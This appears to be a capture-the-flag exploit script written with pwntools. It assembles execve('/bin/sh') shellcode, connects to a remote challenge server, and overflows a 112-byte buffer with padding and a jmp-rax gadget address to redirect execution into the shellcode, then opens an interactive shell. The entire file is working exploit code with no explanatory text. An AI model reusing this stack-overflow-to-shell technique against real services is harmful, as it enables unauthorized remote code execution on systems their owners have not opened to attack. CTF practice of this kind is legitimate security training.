from pwn import *

context.clear(arch='amd64')

# this will be located on rsp
shellcode = asm('''
execve:
    lea rdi, [rip+bin_sh]
    mov rsi, 0
    mov rdx, 0
    mov rax, SYS_execve
    syscall
bin_sh:
    .string "/bin/sh"
''')

p = remote('chals.bitskrieg.in', port=6001)

# rax = rdi = rsp
JMP_RAX = 0x004010ee

p.sendline(shellcode + (112 - len(shellcode))*b'A' + b'A'*8 + p64(JMP_RAX))

p.interactive()
